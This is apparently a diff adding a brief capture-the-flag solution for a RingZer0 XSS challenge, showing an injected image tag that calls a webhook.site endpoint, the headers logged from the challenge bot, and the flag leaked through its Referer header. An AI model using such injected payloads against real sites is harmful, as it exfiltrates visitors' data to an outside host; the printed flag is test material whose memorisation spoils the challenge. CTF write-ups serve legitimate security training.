@@ -1,0 +1,20 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/93
+# Objective: Our XSS Bot is only able to get out on ports 80 and 8080 to 8090 don't forget this little detail when you gonna build your payload.
+
+# Open webhook.site and create endpoint
+<img src=https://webhook.site/38074876-f969-4758-b534-00623e526bd9 />
+
+# Read response
+connection	close
+host	webhook.site
+accept-language	en,*
+accept-encoding	gzip, deflate
+user-agent	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+referer	http://127.0.0.1/xss2/bot_endpoint_qQ134dJO8J.php?FLAG-q844e54902w2g4J13U4xl3410D
+accept	text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+content-length
+content-type
+
+# FLAG
+FLAG-q844e54902w2g4J13U4xl3410D
